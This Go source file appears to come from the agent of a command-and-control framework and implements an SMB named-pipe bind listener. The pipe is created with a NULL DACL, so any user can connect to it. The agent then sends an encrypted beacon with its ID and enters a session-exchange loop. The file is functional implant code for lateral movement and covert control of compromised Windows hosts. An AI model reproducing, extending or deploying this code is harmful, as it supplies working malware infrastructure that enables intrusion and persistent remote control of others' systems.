package main

import (
	"encoding/binary"
	"gopher/functions"
	"gopher/utils"
	"syscall"
	"unsafe"

	"github.com/vmihailenco/msgpack/v5"
)

var (
	advapi32                         = syscall.NewLazyDLL("advapi32.dll")
	procCreateNamedPipeW             = kernel32.NewProc("CreateNamedPipeW")
	procConnectNamedPipe             = kernel32.NewProc("ConnectNamedPipe")
	procInitializeSecurityDescriptor = advapi32.NewProc("InitializeSecurityDescriptor")
	procSetSecurityDescriptorDacl    = advapi32.NewProc("SetSecurityDescriptorDacl")
)

const (
	_PIPE_ACCESS_DUPLEX               = 0x00000003
	_PIPE_TYPE_MESSAGE                = 0x00000004
	_PIPE_READMODE_MESSAGE            = 0x00000002
	_PIPE_WAIT                        = 0x00000000
	_PIPE_UNLIMITED_INSTANCES         = 255
	_ERROR_PIPE_CONNECTED             = 535
	_SECURITY_DESCRIPTOR_REVISION     = 1
	_SECURITY_DESCRIPTOR_MIN_LENGTH   = 40
)

func runBindSMB(sessionInfo []byte, sessionKey []byte, encKey []byte) {
	if len(profile.Addresses) == 0 {
		return
	}
	pipePath := profile.Addresses[0]

	pipeNameUTF16, err := syscall.UTF16PtrFromString(pipePath)
	if err != nil {
		return
	}

	beatPayload, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.AgentType, Data: sessionInfo})
	beatPayload, _ = utils.EncryptData(beatPayload, encKey)

	watermark := make([]byte, 4)
	binary.LittleEndian.PutUint32(watermark, uint32(profile.Type))
	beat := append(watermark, beatPayload...)

	sd := make([]byte, _SECURITY_DESCRIPTOR_MIN_LENGTH)
	procInitializeSecurityDescriptor.Call(uintptr(unsafe.Pointer(&sd[0])), _SECURITY_DESCRIPTOR_REVISION)
	procSetSecurityDescriptorDacl.Call(uintptr(unsafe.Pointer(&sd[0])), 1, 0, 0)

	sa := syscall.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(syscall.SecurityAttributes{})),
		SecurityDescriptor: uintptr(unsafe.Pointer(&sd[0])),
	}

	for ACTIVE {
		r, _, _ := procCreateNamedPipeW.Call(
			uintptr(unsafe.Pointer(pipeNameUTF16)),
			uintptr(_PIPE_ACCESS_DUPLEX),
			uintptr(_PIPE_TYPE_MESSAGE|_PIPE_READMODE_MESSAGE|_PIPE_WAIT),
			uintptr(_PIPE_UNLIMITED_INSTANCES),
			0x100000,
			0x100000,
			0,
			uintptr(unsafe.Pointer(&sa)),
		)
		handle := syscall.Handle(r)
		if handle == syscall.InvalidHandle {
			return
		}

		r, _, callErr := procConnectNamedPipe.Call(uintptr(handle), 0)
		if r == 0 {
			if callErr != syscall.Errno(_ERROR_PIPE_CONNECTED) {
				syscall.CloseHandle(handle)
				continue
			}
		}

		conn := newPipeConn(handle)

		hdr := make([]byte, 4)
		binary.LittleEndian.PutUint32(hdr, uint32(len(beat)))
		if werr := functions.WriteFull(conn, hdr); werr != nil {
			conn.Close()
			continue
		}
		if werr := functions.WriteFull(conn, beat); werr != nil {
			conn.Close()
			continue
		}

		exchangeLoopLE(conn, sessionKey)

		conn.Close()
	}
}
